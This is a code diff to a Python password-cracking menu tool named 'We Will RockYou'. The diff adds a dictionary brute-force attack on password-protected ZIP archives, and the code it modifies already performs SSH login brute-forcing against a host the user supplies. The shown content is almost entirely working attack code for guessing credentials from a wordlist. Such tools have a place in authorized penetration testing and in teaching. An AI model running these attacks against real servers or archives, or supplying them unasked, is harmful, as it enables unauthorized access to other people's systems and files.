@@ -9,8 +9,9 @@
 
 
 # Libraries
-import sys, time, termcolor
+import sys, time, termcolor, zipfile
 from pexpect import pxssh
+from tqdm import tqdm
 
 # Functions
 def main():
@@ -19,8 +20,9 @@ def main():
         ***We Will RockYou Menu***
 1 - Iterate Dictionary/Wordlist
 2 - Search Dictionary/Wordlist
-3 - Perform Brute-Force Attack
-4 - Exit Menu
+3 - Perform Brute-Force SSH Attack
+4 - Perform Brute-Force ZIP Attack
+5 - Exit Menu
 Please Select Mode:
 """)
         if choice=="1":
@@ -31,6 +33,8 @@ Please Select Mode:
         elif choice=="3":
             brute()
         elif choice=="4":
+            unzip()
+        elif choice=="5":
             break
         else:
             print("Invalid Mode! Try Again.")
@@ -90,6 +94,34 @@ def brute():
         print(str(username) + ":" + str(password))
         connect(host,str(username),str(password))
     file.close()
+
+def unzippr(wordlist, path, obj):
+    idx=0
+    print("***Initializing Brute-Force Attack***")
+    with open(wordlist, 'rb') as file:
+        for line in file:
+            for word in line.split():
+                try:
+                    idx+=1
+                    obj.extractall(pwd=word)
+                    print("Password FOUND At Line", idx)
+                    print("Password Is", word.decode())
+                    return True
+                except:
+                    continue
+    return False
+
+def unzip():
+    path=input("Enter Path To .zip File:")
+    wordlist=input("Enter Path To Wordlist/Dictionary:")
+    obj=zipfile.ZipFile(path)
+    cnt=len(list(open(wordlist, "r", encoding="ISO-8859-1")))
+    print("There Are", cnt, "Total Passwords To Test")
+    if unzippr(wordlist, path, obj) == False:
+        print("Password Not Found In This File.")
+
+
+
 
 # Main
 main() 
